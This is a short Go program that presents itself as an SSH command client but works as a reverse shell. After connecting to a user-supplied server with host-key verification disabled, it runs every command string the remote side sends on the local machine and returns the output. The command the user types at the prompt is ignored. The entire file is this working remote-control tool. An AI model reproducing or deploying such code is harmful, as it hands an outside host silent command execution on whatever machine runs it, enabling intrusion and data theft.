package main

import (
	"bufio"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

func main() {
	var ip, port, user, passwd, cmd string

	fmt.Print("Username: ")
	fmt.Scan(&user)

	fmt.Print("Password: ")
	bytepw, err := term.ReadPassword(int(syscall.Stdin))
	if err != nil {
		fmt.Println("ReadPassword Error:", err)
		return
	}
	passwd = string(bytepw)
	fmt.Println()

	fmt.Print("Enter server IP: ")
	fmt.Scan(&ip)

	fmt.Print("Enter port or <CR>: ")
	fmt.Scanln(&port)
	if port == "" {
		port = "22"
	}

	fmt.Print("Enter command or <CR>: ")
	reader := bufio.NewReader(os.Stdin)
	cmd, _ = reader.ReadString('\n')

	fmt.Println("ip:", ip, "port:", port, "user:", user, "passwd:", "******", "cmd:", cmd)

	sshCommand(ip, port, user, passwd, "ClientConnected")
}

func sshCommand(ip, port, user, passwd, cmd string) {
	conf := ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(passwd)},
	}

	addr := ip + ":" + port
	conn, err := ssh.Dial("tcp", addr, &conf)
	if err != nil {
		fmt.Println("SSH Dial Error:", err)
		return
	}
	defer conn.Close()

	session, err := conn.NewSession()
	if err != nil {
		fmt.Println("Client NewSession Error:", err)
		return
	}
	defer session.Close()

	w, err := session.StdinPipe()
	if err != nil {
		fmt.Println("Session StdinPipe Error:", err)
		return
	}

	r, err := session.StdoutPipe()
	if err != nil {
		fmt.Println("Session StdoutPipe Error:", err)
		return
	}

	_, err = w.Write([]byte(cmd))
	if err != nil {
		fmt.Println("Write Cmd Error:", err)
	}

	var recv [1024]byte
	n, err := r.Read(recv[:])
	if err != nil {
		fmt.Println("Read Recv Error:", err)
		return
	}
	fmt.Println("<", string(recv[:n]))

	for {
		var recv [1024]byte
		n, err := r.Read(recv[:])
		if err != nil {
			fmt.Println("Read Recv Error:", err)
			break
		}

		cmd := string(recv[:n])
		if cmd == "exit" {
			break
		}

		output := execute(cmd)
		if output == nil {
			output = []byte("okay")
		}
		// fmt.Println("Exec Command Output:", string(output))

		w.Write(output)
	}
}

func execute(cmd string) []byte {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return nil
	}

	cmdAndArgs := strings.Split(cmd, " ")
	command := exec.Command(cmdAndArgs[0], cmdAndArgs[1:]...)

	// 获取标准输出
	closer, err := command.StdoutPipe()
	if err != nil {
		return []byte(err.Error())
	}

	command.Start()

	// 从标准输出中获取命令执行结果
	output, err := io.ReadAll(closer)
	if err != nil {
		return []byte(err.Error())
	}

	command.Wait()

	return output
}
